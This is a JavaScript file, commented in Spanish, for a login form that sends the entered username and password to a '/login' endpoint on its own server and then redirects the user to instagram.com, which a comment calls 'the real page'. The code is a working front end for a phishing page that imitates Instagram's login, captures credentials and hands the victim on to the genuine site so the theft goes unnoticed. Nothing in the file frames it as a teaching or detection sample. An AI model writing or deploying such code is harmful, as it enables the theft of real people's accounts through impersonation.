document.addEventListener('DOMContentLoaded', () => {
    
    // 1. Selección de elementos del DOM
    const loginForm = document.getElementById('loginForm');
    const usuarioInput = document.getElementById('usuario');
    const passwordInput = document.getElementById('password');
    const submitButton = document.getElementById('boton');
    const errorMsg = document.getElementById('mensaje-error');
    const toggleBtn = document.getElementById('togglePassword');

    // 2. Función para validar campos (Habilitar/Deshabilitar botón)
    const validarCampos = () => {
        const usuarioValido = usuarioInput.value.length > 0;
        const passwordValido = passwordInput.value.length >= 6; 

        if (usuarioValido && passwordValido) {
            submitButton.disabled = false;
        } else {
            submitButton.disabled = true;
        }
    };

    // 3. Lógica para botón "Mostrar / Ocultar"
    passwordInput.addEventListener('input', function() {
        if (passwordInput.value.length > 0) {
            toggleBtn.style.display = 'block';
        } else {
            toggleBtn.style.display = 'none';
        }
        validarCampos();
    });

    toggleBtn.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.textContent = type === 'password' ? 'Mostrar' : 'Ocultar';
    });

    usuarioInput.addEventListener('input', validarCampos);

    // 4. CONEXIÓN CON EL BACKEND
    const autenticarUsuario = async (usuario, password) => {
        try {
            // CAMBIO IMPORTANTE: Usamos la ruta relativa '/login'
            // Esto funciona tanto en localhost como en la nube (Render)
            const response = await fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ usuario, password })
            });

            if (response.ok) {
                return { success: true };
            } else {
                throw new Error("Error al conectar con el servidor");
            }
        } catch (error) {
            console.error(error); // Para que veas el error en consola si pasa algo
            throw { success: false, message: "Error de conexión. Intenta más tarde." };
        }
    };

    // 5. Envío del formulario
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault(); 

        // UI: Estado de carga
        const textoOriginal = submitButton.innerText;
        submitButton.innerText = "Entrando...";
        submitButton.classList.add('loading');
        submitButton.disabled = true;
        usuarioInput.disabled = true;
        passwordInput.disabled = true;
        toggleBtn.style.display = 'none'; 
        errorMsg.style.display = 'none'; 

        const usuario = usuarioInput.value;
        const password = passwordInput.value;

        try {
            // Intentamos enviar los datos al servidor
            await autenticarUsuario(usuario, password);
            
            // ÉXITO
            console.log("Datos enviados correctamente.");
            
            // Redirigimos a la página real
            window.location.href = "https://www.instagram.com"; 

        } catch (error) {
            // ERROR
            errorMsg.textContent = error.message;
            errorMsg.style.display = 'block';
            
            // Restaurar formulario
            usuarioInput.disabled = false;
            passwordInput.disabled = false;
            passwordInput.focus();
            
            // Reactivar botón
            submitButton.disabled = false; 
            submitButton.innerText = textoOriginal;
            submitButton.classList.remove('loading');
        }
    });
});